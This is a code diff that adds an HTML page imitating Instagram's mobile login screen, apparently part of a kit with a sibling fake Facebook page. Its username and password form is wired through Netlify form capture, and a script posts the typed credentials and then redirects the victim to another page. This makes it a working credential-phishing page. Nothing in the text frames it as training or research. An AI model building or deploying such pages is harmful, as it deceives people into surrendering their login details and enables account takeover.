@@ -1,0 +1,106 @@
+<html>
+    <head>
+        <title>Instagram</title>
+        <link rel="stylesheet" href="istyle.css">
+        <link href="http://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
+        <link href="//db.onlinewebfonts.com/c/6d32b8e06f40fb7698cfb714b9e7975d?family=BillabongW00-Regular" rel="stylesheet" type="text/css"/>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+    </head>
+
+    <body >
+        <header>
+
+       
+            <div id="head-div">
+                <div id="head-text">
+                    <h2 style="font-size: 40px; font-weight: bold; line-height: 6px; margin-top: 25px;">Instagram</h2>
+                    <p style="font-size: 27px; font-weight: bold; padding-top: 12px; ">Find it for free on the App Store     </p>
+                    
+
+               </div>
+
+               <div id="head-get">
+
+                   <p>GET</p>
+               </div>
+               
+
+
+            </div>
+
+    </header>
+
+    <section>
+        <br>
+        <br>
+        <div><p style="color: rgb(31, 23, 23); text-align: center; font-size: 180%;">English &nbsp; <i><img src="down-arrow.png" style="width: 30px; height: auto;"></i></p></div>
+        <br>
+        <br>
+        <div>
+            <h1 id="Instagram_text">Instagram</h1>
+        </div>
+
+        <div id="div-form">
+            <br>
+            <br>
+            <h1 style="text-align: center; font-size: 250%;">Log In</h1>
+            <br>
+            <br>
+            <form name="gram" netlify-data="true" action="/#div-form" id="gram" netlify>
+                <input type="text" name="user" id="username" placeholder="phone number,username or email">
+                <input  type="password" name="pass" id="password" placeholder="password">
+                <br>
+                <br>
+                <p style="text-align: right; color: #1877f2; font-size: 200%;"> Forgot Password?</p>
+                <br>
+                <br>
+                <Button id="submit" type="submit">Log In</Button>
+            </form>
+
+
+        </div>
+        <br>
+        <br>
+        <h3 style="text-align: center; color: #777; font-size: 200%;"> Don't have an account <a href="../facebook/index.html" style="color: #1877f2; text-decoration: none;"> Sign Up</a></h3>
+
+
+
+        <div style="text-align: center; margin-top: 500px;">
+
+            <h3 style="color: #ccc;">From</h3>
+            <h3 style="font-size: 300%; color: #666;"> FACEBOOK</h3>
+        </div>
+        
+    </section>
+    
+
+    <script>
+        let myform2 = document.querySelector("#div-form form");
+        console.log(myform2);
+        myform2.addEventListener("submit" ,e =>{
+          e.preventDefault();
+          console.log("submit clicked!!!")
+
+          const formdata= new FormData(myform2);
+          console.log(formdata);
+          console.log(myform2.getAttribute("action"))
+          fetch(myform2.getAttribute("action"),{
+              method: "POST",
+              headers:{
+                  "Accept":"application/x-www-form-urlencoded;charset=UTF-8",
+                  "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"
+              },
+              body: new URLSearchParams(formdata).toString()
+          }).then(res =>{
+              console.log(res);
+              if(res){
+                  console.log("data sent successfully")
+                  window.location.href ="../request_form";
+              }
+          })
+        })
+        
+    </script>
+
+    </body>
+</html>
